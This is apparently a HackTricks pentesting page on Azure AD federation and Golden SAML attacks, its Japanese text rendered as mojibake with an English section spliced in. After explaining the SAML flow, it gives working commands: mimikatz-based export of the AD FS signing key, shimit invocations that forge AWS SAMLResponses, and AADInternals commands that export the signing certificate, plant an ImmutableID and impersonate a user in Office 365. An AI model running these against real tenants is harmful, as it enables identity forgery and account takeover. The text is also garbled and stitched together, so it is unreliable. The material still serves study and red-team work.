# ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³

<details>

<summary><strong>ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **HackTricks** ã§ **ä¼šç¤¾ã®åºƒå‘Šã‚’è¦‹ãŸã„**å ´åˆã‚„ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å…¥æ‰‹ã—ãŸã„**å ´åˆã€ã¾ãŸã¯ **HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¾ã—ã‚‡ã†
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ **@carlospolopm** ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¾ã—ã‚‡ã† ğŸ¦
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€** [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã® GitHub ãƒªãƒã‚¸ãƒˆãƒªã« PR ã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

## åŸºæœ¬æƒ…å ±

**ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³**ã¯ã€**ä¿¡é ¼é–¢ä¿‚**ã‚’ç¢ºç«‹ã—ãŸ**ãƒ‰ãƒ¡ã‚¤ãƒ³**ã®é›†åˆã§ã™ã€‚ä¿¡é ¼ãƒ¬ãƒ™ãƒ«ã¯ç•°ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ãŒã€é€šå¸¸ã¯**èªè¨¼**ã‚’å«ã¿ã€ã»ã¼å¸¸ã«**èªå¯**ã‚‚å«ã¾ã‚Œã¾ã™ã€‚å…¸å‹çš„ãªãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã«ã¯ã€å…±æœ‰ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã®ãŸã‚ã«**ä¿¡é ¼**ã‚’ç¢ºç«‹ã—ãŸ**è¤‡æ•°ã®çµ„ç¹”**ãŒå«ã¾ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ç’°å¢ƒã‚’**Azure AD**ã¨ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã—ã€ã“ã®ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’èªè¨¼ãŠã‚ˆã³èªå¯ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ã‚µã‚¤ãƒ³ã‚¤ãƒ³æ–¹æ³•ã«ã‚ˆã‚Šã€ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**èªè¨¼ãŒã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã§è¡Œã‚ã‚Œã¾ã™**ã€‚ã“ã®æ–¹æ³•ã§ã¯ã€ç®¡ç†è€…ã¯ã‚ˆã‚Šå³æ ¼ãªã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ãƒ¬ãƒ™ãƒ«ã‚’å®Ÿè£…ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚**AD FS**ãŠã‚ˆã³PingFederateã¨ã®ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãŒåˆ©ç”¨å¯èƒ½ã§ã™ã€‚

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

åŸºæœ¬çš„ã«ã€ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã§ã¯ã€ã™ã¹ã¦ã®**èªè¨¼**ãŒ**ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹**ç’°å¢ƒã§è¡Œã‚ã‚Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ä¿¡é ¼ã•ã‚ŒãŸã™ã¹ã¦ã®ç’°å¢ƒã§SSOã‚’ä½“é¨“ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯**ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã®è³‡æ ¼æƒ…å ±**ã‚’ä½¿ç”¨ã—ã¦**ã‚¯ãƒ©ã‚¦ãƒ‰**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

**ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¢ã‚µãƒ¼ã‚·ãƒ§ãƒ³ãƒãƒ¼ã‚¯ã‚¢ãƒƒãƒ—è¨€èªï¼ˆSAMLï¼‰**ã¯ã€ãƒ—ãƒ­ãƒã‚¤ãƒ€é–“ã§èªè¨¼ãŠã‚ˆã³èªå¯ã®ã™ã¹ã¦ã®æƒ…å ±ã‚’**äº¤æ›**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã§ã¯ã€æ¬¡ã®3ã¤ã®ãƒ‘ãƒ¼ãƒ†ã‚£ãŒå­˜åœ¨ã—ã¾ã™ã€‚

* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¾ãŸã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ
* Identity Providerï¼ˆIdPï¼‰
* Service Providerï¼ˆSPï¼‰

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. æœ€åˆã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ï¼ˆService Providerã¨ã‚‚å‘¼ã°ã‚Œã‚‹ï¼‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚ã“ã‚Œã¯AWSã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã€vSphere Webã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãªã©ã§ã™ã€‚å®Ÿè£…ã«ã‚ˆã£ã¦ã¯ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯æœ€åˆã«IdPã«ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹ã—ã€ã“ã®å›³ã®æœ€åˆã®ã‚¹ãƒ†ãƒƒãƒ—ã‚’ã‚¹ã‚­ãƒƒãƒ—ã™ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚
2. ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’èªè¨¼ã™ã‚‹ãŸã‚ã«IdPï¼ˆIdentity Providerã€AD FSã€Oktaãªã©ï¼‰ã‚’æ¤œå‡ºã—ã€SAML AuthnRequestã‚’ç”Ÿæˆã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚’IdPã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã—ã¾ã™ã€‚
3. IdPã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’èªè¨¼ã—ã€SAMLResponseã‚’ç”Ÿæˆã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä»‹ã—ã¦SPã«æŠ•ç¨¿ã—ã¾ã™ã€‚
4. SPã¯SAMLResponseã‚’ãƒã‚§ãƒƒã‚¯ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãƒ­ã‚°ã‚¤ãƒ³ã•ã›ã¾ã™ã€‚SPã¯IdPã¨ã®ä¿¡é ¼é–¢ä¿‚ã‚’æŒã£ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã‚µãƒ¼ãƒ“ã‚¹ã‚’åˆ©ç”¨ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

**SAMLèªè¨¼ã¨ä¸€èˆ¬çš„ãªæ”»æ’ƒã«ã¤ã„ã¦è©³ã—ãå­¦ã³ãŸã„å ´åˆã¯ã€æ¬¡ã®ãƒªãƒ³ã‚¯ã‚’å‚ç…§ã—ã¦ãã ã•ã„:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## ãƒ”ãƒœãƒƒãƒˆ

* AD FSã¯ã€ã‚¯ãƒ¬ãƒ¼ãƒ ãƒ™ãƒ¼ã‚¹ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãƒ¢ãƒ‡ãƒ«ã§ã™ã€‚
* "..ã‚¯ãƒ¬ãƒ¼ãƒ ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é–¢ã—ã¦è¡Œã‚ã‚Œã‚‹ä¸»ã«ã‚¯ãƒ¬ãƒ¼ãƒ ãƒ™ãƒ¼ã‚¹ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã®è¨±å¯ã«ä½¿ç”¨ã•ã‚Œã‚‹ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã¤ã„ã¦ã®ä¸»å¼µï¼ˆãŸã¨ãˆã°ã€åå‰ã€ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã€ã‚°ãƒ«ãƒ¼ãƒ—ï¼‰ã§ã™ã€‚"
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¯ãƒ¬ãƒ¼ãƒ ã¯SAMLãƒˆãƒ¼ã‚¯ãƒ³å†…ã«æ›¸ã‹ã‚Œã€IdPã«ã‚ˆã£ã¦æ©Ÿå¯†æ€§ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ç½²åã•ã‚Œã¾ã™ã€‚
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ImmutableIDã«ã‚ˆã£ã¦è­˜åˆ¥ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã‚°ãƒ­ãƒ¼ãƒãƒ«ã«ä¸€æ„ã§ã‚ã‚Šã€Azure ADã«æ ¼ç´ã•ã‚Œã¦ã„ã¾ã™ã€‚
* ImmutableIDã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãŸã‚ã®Azure ADã®ConsistencyGuidã¨ã—ã¦ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã«æ ¼ç´ã•ã‚Œã€ã¾ãŸã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®GUIDã‹ã‚‰æ´¾ç”Ÿã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* è©³ç´°ã¯[https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

**Golden SAMLæ”»æ’ƒ:**

* ADFSã§ã¯ã€SAMLãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¯ãƒˆãƒ¼ã‚¯ãƒ³ç½²åè¨¼æ˜æ›¸ã«ã‚ˆã£ã¦ç½²åã•ã‚Œã¾ã™ã€‚
* è¨¼æ˜æ›¸ãŒä¾µå®³ã•ã‚ŒãŸå ´åˆã€Azure ADã«åŒæœŸã•ã‚ŒãŸ**ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦**Azure ADã«èªè¨¼ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼
* PTAã®æ‚ªç”¨ã¨åŒæ§˜ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å¤‰æ›´ã‚„MFAã¯åŠ¹æœãŒã‚ã‚Šã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€ç§ãŸã¡ã¯èªè¨¼ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’å½é€ ã—ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚
* è¨¼æ˜æ›¸ã¯DAæ¨©é™ã‚’æŒã¤AD FSã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰æŠ½å‡ºã—ã€ãã®å¾Œã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã«æ¥ç¶šã•ã‚ŒãŸä»»æ„ã®ãƒã‚·ãƒ³ã‹ã‚‰ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* è©³ç´°ã¯[https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### Golden SAML

å‰ã®ã‚¹ã‚­ãƒ¼ãƒã‹ã‚‰æœ€ã‚‚èˆˆå‘³æ·±ã„ã®ã¯ã€3ç•ªç›®ã®éƒ¨åˆ†ã§ã™ã€‚ã“ã“ã§ã¯ã€**IdP**ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã‚’è¨±å¯ã™ã‚‹**SAMLResponse**ã‚’ç”Ÿæˆã—ã¾ã™ã€‚ç‰¹å®šã®IdPã®å®Ÿè£…ã«ã‚ˆã£ã¦ã¯ã€**ãƒ¬ã‚¹ãƒãƒ³ã‚¹**ã¯IdPã®**ç§˜å¯†éµ**ã«ã‚ˆã£ã¦**ç½²å**ã¾ãŸã¯**æš—å·åŒ–**ã•ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**SPã¯**ä¿¡é ¼ã§ãã‚‹IdPã«ã‚ˆã£ã¦SAMLResponseãŒä½œæˆã•ã‚ŒãŸã“ã¨ã‚’**æ¤œè¨¼**ã§ãã¾ã™ã€‚

[ã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³ãƒã‚±ãƒƒãƒˆæ”»æ’ƒ](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)ã¨åŒæ§˜ã«ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã¨æ¨©é™ã‚’ä¿æŒã™ã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’**ç½²å**ã™ã‚‹**ã‚­ãƒ¼**ï¼ˆã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³ãƒã‚±ãƒƒãƒˆã®å ´åˆã¯_KRBTGT_ã€ã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³SAMLã®å ´åˆã¯ãƒˆãƒ¼ã‚¯ãƒ³ç½²åã®ç§˜å¯†éµï¼‰ã‚’ä½¿ç”¨ã—ã¦ã€**ã“ã®ã‚ˆã†ãªã€Œèªè¨¼ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã€**ï¼ˆTGTã¾ãŸã¯SAMLResponseï¼‰ã‚’**å½é€ **ã—ã€ä¸æ­£ãªã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ã‚‹ãŸã‚ã«ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

ã•ã‚‰ã«ã€ã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³SAMLã«ã¯ä»¥ä¸‹ã®åˆ©ç‚¹ãŒã‚ã‚Šã¾ã™:

*
#### AWS + AD FS + Golden SAML = â™¥ï¼ˆã‚±ãƒ¼ã‚¹ã‚¹ã‚¿ãƒ‡ã‚£ï¼‰

[Active Directory Federation Services](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\))ï¼ˆ**AD FS**ï¼‰ã¯ã€ä¿¡é ¼ã§ãã‚‹ãƒ“ã‚¸ãƒã‚¹ãƒ‘ãƒ¼ãƒˆãƒŠãƒ¼é–“ã§ã®**ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£æƒ…å ±ã®å®‰å…¨ãªå…±æœ‰**ã‚’å¯èƒ½ã«ã™ã‚‹ã€Microsoftã®æ¨™æº–ãƒ™ãƒ¼ã‚¹ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚µãƒ¼ãƒ“ã‚¹ã§ã™ï¼ˆ**ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³**ï¼‰ã€‚ã“ã‚Œã¯ã€ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®ä»–ã®ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ã«ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’æä¾›ã™ã‚‹ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®ã‚µãƒ¼ãƒ“ã‚¹ã§ã™ã€‚

AWSãŒï¼ˆãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³å†…ã®ï¼‰ä¾µå®³ã—ãŸãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’**ä¿¡é ¼ã—ã¦ã„ã‚‹**ã¨ä»®å®šã™ã‚‹ã¨ã€ã“ã®æ”»æ’ƒã‚’åˆ©ç”¨ã—ã¦ã€å®Ÿè³ªçš„ã«**ã‚¯ãƒ©ã‚¦ãƒ‰ç’°å¢ƒã§ä»»æ„ã®æ¨©é™ã‚’å–å¾—**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã¯ã€SAMLã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ç½²åã™ã‚‹**ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚­ãƒ¼**ãŒå¿…è¦ã§ã™ï¼ˆã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³ãƒã‚±ãƒƒãƒˆã®å ´åˆã¨åŒæ§˜ã«ã€KRBTGTãŒå¿…è¦ã§ã™ï¼‰ã€‚ã“ã®ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚­ãƒ¼ã«ã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ç®¡ç†è€…ã®ã‚¢ã‚¯ã‚»ã‚¹ã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“ã€‚AD FSãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ã¿ãŒå¿…è¦ã§ã™ã€‚

ä»¥ä¸‹ã¯ã€ã‚´ãƒ¼ãƒ«ãƒ‡ãƒ³SAMLæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®è¦ä»¶ã®ãƒªã‚¹ãƒˆã§ã™ï¼š

* **ãƒˆãƒ¼ã‚¯ãƒ³ç½²åã®ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚­ãƒ¼**
* **IdPã®å…¬é–‹è¨¼æ˜æ›¸**
* **IdPã®åå‰**
* **ã‚¢ã‚µãƒ ã™ã‚‹ãƒ­ãƒ¼ãƒ«ã®åå‰**
* ãƒ‰ãƒ¡ã‚¤ãƒ³\ãƒ¦ãƒ¼ã‚¶ãƒ¼å
* AWSã§ã®ãƒ­ãƒ¼ãƒ«ã‚»ãƒƒã‚·ãƒ§ãƒ³å
* Amazonã‚¢ã‚«ã‚¦ãƒ³ãƒˆID

_å¿…é ˆã®è¦ä»¶ã¯å¼·èª¿è¡¨ç¤ºã•ã‚Œã¦ã„ã¾ã™ã€‚ãã®ä»–ã®å¿…é ˆã§ãªã„ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«ã¤ã„ã¦ã¯ã€å¥½ããªå€¤ã‚’å…¥åŠ›ã§ãã¾ã™ã€‚_

**ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚­ãƒ¼**ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã¯ã€**AD FSã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¿…è¦ã§ã‚ã‚Šã€ãã®**ãƒ‘ãƒ¼ã‚½ãƒŠãƒ«ã‚¹ãƒˆã‚¢**ã‹ã‚‰**ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚­ãƒ¼ã‚’ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆ**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆ[mimikatz](https://github.com/gentilkiwi/mimikatz)ãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã§ãã¾ã™ï¼‰ã€‚ãã®ä»–ã®è¦ä»¶ã«ã¤ã„ã¦ã¯ã€PowerShellã‚¹ãƒŠãƒƒãƒ—ã‚¤ãƒ³Microsoft.Adfs.Powershellã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ã€æ¬¡ã®ã‚ˆã†ã«ä½¿ç”¨ã—ã¾ã™ï¼ˆADFSãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ï¼š
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
ã™ã¹ã¦ã®æƒ…å ±ã‚’æŒã£ã¦ã„ã‚‹ã¨ã€[**shimit**](https://github.com/cyberark/shimit)ã‚’ä½¿ç”¨ã—ã¦ãªã‚Šã™ã¾ã—ã‚’ã—ãŸã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦æœ‰åŠ¹ãªSAMLResponseã‚’å¿˜ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ -> ã‚¯ãƒ©ã‚¦ãƒ‰
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
# Federation

## Introduction

In Azure AD Connect, the ImmutableID attribute is used to link on-premises users with their corresponding cloud-only users. This attribute is essential for the synchronization process and ensures that the correct user accounts are connected.

## Impersonating Cloud-Only Users

By manipulating the ImmutableID attribute, it is possible to create an ImmutableID for cloud-only users and impersonate them. This can be done by generating a valid ImmutableID value and assigning it to a cloud-only user account.

## Steps to Impersonate Cloud-Only Users

To impersonate a cloud-only user, follow these steps:

1. Generate a valid ImmutableID value.
2. Assign the generated ImmutableID value to the cloud-only user account.
3. Use the impersonated user account to gain unauthorized access or perform malicious activities.

## Mitigation

To mitigate the risk of impersonation, it is important to implement proper security measures. This includes:

- Regularly monitoring and auditing user accounts for any suspicious activity.
- Enforcing strong password policies and multi-factor authentication.
- Limiting user privileges and access rights.
- Keeping the Azure AD Connect server up to date with the latest security patches.

By following these best practices, you can reduce the likelihood of unauthorized access and protect your organization's data.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## å‚è€ƒæ–‡çŒ®

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **HackTricks**ã§**ä¼šç¤¾ã®åºƒå‘Šã‚’è¦‹ãŸã„**å ´åˆã‚„ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã™ã‚‹
